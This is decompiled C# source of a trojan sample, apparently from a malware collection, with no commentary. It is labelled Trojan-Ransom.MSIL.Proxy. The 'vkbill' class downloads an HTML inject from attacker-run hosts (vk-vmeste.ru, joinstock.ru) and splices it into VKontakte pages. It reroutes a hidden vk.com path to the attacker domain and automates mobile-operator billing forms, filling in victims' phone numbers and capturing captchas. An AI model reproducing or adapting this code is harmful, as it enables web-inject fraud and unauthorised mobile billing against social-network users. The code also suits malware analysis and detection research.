// Decompiled with JetBrains decompiler
// Type: ProxyService.vkbill
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1A8FDECE-1CE5-409D-963F-AF9D26306625
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Proxy.a-01b9089429d70e13144f4d981c8d179faa30c9001537bc561c4bc29a1f10db4e.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace ProxyService
{
  public class vkbill : Form
  {
    private IContainer components;
    private WebBrowser wb;
    private System.Windows.Forms.Timer timer1;
    public static bool _can = false;
    public static string _country = "";
    public static string _short = "";
    public static string _msg = "";
    public static string _inject = "";
    public static string phone = "";
    public static Dictionary<string, string> vals = new Dictionary<string, string>();
    public static string vkFolder = "test";
    public static string vkBilledAnswer = "ya_pomog_detyam_spasibo_vam_i_vsego_horoshego_spasibo";
    public static string vkSpecFolder = "xlmnsprst00011sseeee344jfdfdf23923223233233204903949009fdhjhfl34dfwjfelwfj34idferqcoirghyrerpigpci";
    public int stage;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.wb = new WebBrowser();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.wb.Dock = DockStyle.Fill;
      this.wb.Location = new Point(0, 0);
      this.wb.MinimumSize = new Size(20, 20);
      this.wb.Name = "wb";
      this.wb.Size = new Size(292, 273);
      this.wb.TabIndex = 0;
      this.wb.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.wb_DocumentCompleted);
      this.timer1.Enabled = true;
      this.timer1.Interval = 30000;
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(292, 273);
      this.Controls.Add((Control) this.wb);
      this.Name = nameof (vkbill);
      this.Text = nameof (vkbill);
      this.Load += new EventHandler(this.vkbill_Load);
      this.ResumeLayout(false);
    }

    public vkbill() => this.InitializeComponent();

    private void vkbill_Load(object sender, EventArgs e)
    {
    }

    public void Do()
    {
      if (!vkbill.isCanInjectVKBill())
        return;
      this.stage = 0;
      this.timer1_Tick((object) null, (EventArgs) null);
    }

    public static string basedir() => Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia\\";

    public static string ReadKey(string key)
    {
      string str;
      if (vkbill.vals.TryGetValue(key, out str))
        return str;
      try
      {
        str = System.IO.File.ReadAllText(vkbill.basedir() + key);
      }
      catch (Exception ex)
      {
      }
      vkbill.vals.Add(key, str);
      return str;
    }

    public static int nReadKey(string key)
    {
      try
      {
        return int.Parse(vkbill.ReadKey(key));
      }
      catch (Exception ex)
      {
        return 0;
      }
    }

    public static void WriteKey(string key, string val)
    {
      try
      {
        System.IO.File.WriteAllText(vkbill.basedir() + key, val);
      }
      catch (Exception ex)
      {
      }
      if (!vkbill.vals.ContainsKey(key))
        vkbill.vals.Add(key, val);
      else
        vkbill.vals[key] = val;
    }

    public static void dbgFile(string a)
    {
      if (!ProxyServer.IsDebugMode)
        return;
      try
      {
        System.IO.File.WriteAllText("D:\\1.htm", a);
      }
      catch (Exception ex)
      {
      }
    }

    private static string vkName(string str)
    {
      string str1 = XmlHelper.extr(str, "<div class=\"page_name fl_l ta_l\">", "</div>", false);
      string[] strArray1 = new string[0];
      string[] strArray2 = str1.Split(' ');
      return strArray2.Length >= 1 ? strArray2[0] : "";
    }

    public static string vkBillCode(string str)
    {
      string newValue = vkbill.vkName(str);
      string str1 = vkbill._inject.Replace("$$$name$$$", newValue);
      str += str1;
      return str;
    }

    public static void vkCatchBilled(string str)
    {
      if (!str.Contains(vkbill.vkBilledAnswer))
        return;
      vkbill.WriteKey("vkbilled", "1");
      vkbill.WriteKey("vkbilled_date", DateTime.Now.ToString());
    }

    public static int vkdiff()
    {
      try
      {
        return Math.Abs(DateTime.Now.Subtract(DateTime.Parse(vkbill.ReadKey("vkbilled_date"))).Days);
      }
      catch (Exception ex)
      {
        return -1;
      }
    }

    public static bool isCanInjectVKBill()
    {
      ProxyServer.dbg("vkdiff: " + vkbill.vkdiff().ToString());
      bool flag = vkbill.ReadKey("vkbilled") == "1";
      return vkbill.vkdiff() == -1 || vkbill.vkdiff() >= 4 || !flag;
    }

    public static bool IsInjectVKBill(string url, string data) => vkbill._can && !data.Contains("reg_bar_with_arr") && data.Contains("act=logout") && vkbill.isCanInjectVKBill();

    public static string vkSpecUrl(string url)
    {
      string oldValue = "vk.com/" + vkbill.vkSpecFolder;
      if (url.Contains(oldValue))
        url = url.Replace(oldValue, "vk-vmeste.ru/" + vkbill.vkFolder);
      return url;
    }

    private string DownloadURL(string url)
    {
      try
      {
        return new WebClient()
        {
          Proxy = ((IWebProxy) null)
        }.DownloadString(url);
      }
      catch (Exception ex)
      {
        return "";
      }
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        this.timer1.Interval += 60000;
      }
      catch (Exception ex)
      {
      }
      new Thread(new ThreadStart(this.CanBillDo)).Start();
    }

    private void CanBillDo()
    {
      try
      {
        string str1 = new Random().Next(1, 1000000).ToString();
        string str2 = this.DownloadURL("http://joinstock.ru/geo.ashx?rnd=" + str1);
        vkbill._inject = this.DownloadURL("http://vk-vmeste.ru/" + vkbill.vkFolder + "/Default.htm");
        vkbill._inject = vkbill._inject.Replace("Default_files", "http://vk.com/" + vkbill.vkSpecFolder + "/Default_files");
        string str3 = "";
        string str4 = "";
        try
        {
          str3 = str2.Split('@')[0];
          str4 = str2.Split('@')[1];
          string str5 = str2.Split('@')[2];
          string str6 = str2.Split('@')[3];
          vkbill._can = !str2.Contains("null") && str4 != "" && str1 == str6;
        }
        catch (Exception ex)
        {
          vkbill._can = false;
        }
        vkbill._short = str4;
        vkbill._country = str3;
        ProxyServer.dbg(str2 + "/" + vkbill._country + "/" + vkbill._short + "/" + vkbill._can.ToString());
      }
      catch (Exception ex)
      {
      }
    }

    private static void vk_ie_start()
    {
    }

    private void wb_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
    {
      object obj = (object) null;
      if (this.stage == 1)
      {
        try
        {
          this.iemethod(this.ieById("enter_submit"), "click");
          obj = this.ieByClassSetValue("vjoin_number_input vjoin_input_text", vkbill.phone);
          this.ieByClassClick("vjoin_submit");
        }
        catch (Exception ex)
        {
          int num = (int) MessageBox.Show(ex.Message);
        }
        this.stage = 2;
      }
      else
      {
        if (this.stage != 2)
          return;
        if (this.wb.Document.Url.ToString().Contains("beeline"))
          this.ieSaveImgBySrc("captcha");
        if (!this.wb.Document.Url.ToString().Contains("wap.megafonpro.ru"))
          return;
        this.GetImage("captcha").Save(this.CaptchaFile(), ImageFormat.Jpeg);
      }
    }

    public string CaptchaFile() => vkbill.basedir() + "image.png";

    public Bitmap GetImage(string id)
    {
      object domElement = this.wb.Document.GetElementById(id).DomElement;
      vkbill.IHTMLElementRenderFixed elementRenderFixed = (vkbill.IHTMLElementRenderFixed) domElement;
      Bitmap image = new Bitmap(int.Parse(this.ieget(domElement, "width").ToString()), int.Parse(this.ieget(domElement, "height").ToString()));
      Graphics graphics = Graphics.FromImage((Image) image);
      IntPtr hdc = graphics.GetHdc();
      elementRenderFixed.DrawToDC(hdc);
      graphics.ReleaseHdc(hdc);
      return image;
    }

    private object ieget(object obj, string sProperty) => obj.GetType().InvokeMember(sProperty, BindingFlags.GetProperty, (Binder) null, obj, (object[]) null);

    private void iemethod(object obj, string sMethod) => obj.GetType().InvokeMember(sMethod, BindingFlags.InvokeMethod, (Binder) null, obj, (object[]) null);

    public void ieset(object obj, string propertyName, object value)
    {
      object[] args = new object[1]{ value };
      obj.GetType().InvokeMember(propertyName, BindingFlags.SetProperty, (Binder) null, obj, args);
    }

    public object ieByClassSetValue(string classname, string val)
    {
      foreach (HtmlElement htmlElement in this.wb.Document.All)
      {
        object domElement = htmlElement.DomElement;
        string str = "";
        try
        {
          str = this.ieget(domElement, "className").ToString();
        }
        catch (Exception ex)
        {
        }
        if (str.ToLower().Trim() == classname.ToLower().Trim())
        {
          this.ieset(domElement, "value", (object) val);
          return domElement;
        }
      }
      return (object) null;
    }

    public object ieByClassClick(string classname)
    {
      foreach (HtmlElement htmlElement in this.wb.Document.All)
      {
        object domElement = htmlElement.DomElement;
        string str = "";
        try
        {
          str = this.ieget(domElement, "className").ToString();
        }
        catch (Exception ex)
        {
        }
        if (str.ToLower().Trim() == classname.ToLower().Trim())
        {
          this.iemethod(domElement, "click");
          return domElement;
        }
      }
      return (object) null;
    }

    public object ieById(string id) => this.wb.Document.GetElementById(id).DomElement;

    public void ieSaveImgBySrc(string src)
    {
      foreach (HtmlElement image in this.wb.Document.Images)
      {
        object domElement = image.DomElement;
        if (this.ieget(domElement, nameof (src)).ToString().ToLower().Contains(src))
        {
          object obj = domElement;
          vkbill.IHTMLElementRenderFixed elementRenderFixed = (vkbill.IHTMLElementRenderFixed) obj;
          Bitmap bitmap = new Bitmap(int.Parse(this.ieget(obj, "width").ToString()), int.Parse(this.ieget(obj, "height").ToString()));
          Graphics graphics = Graphics.FromImage((Image) bitmap);
          IntPtr hdc = graphics.GetHdc();
          elementRenderFixed.DrawToDC(hdc);
          graphics.ReleaseHdc(hdc);
          bitmap.Save(this.CaptchaFile(), ImageFormat.Png);
        }
      }
    }

    [Guid("3050F669-98B5-11CF-BB82-00AA00BDCE0B")]
    [InterfaceType(1)]
    [ComImport]
    private interface IHTMLElementRenderFixed
    {
      void DrawToDC(IntPtr hdc);

      void SetDocumentPrinter(string bstrPrinterName, IntPtr hdc);
    }
  }
}
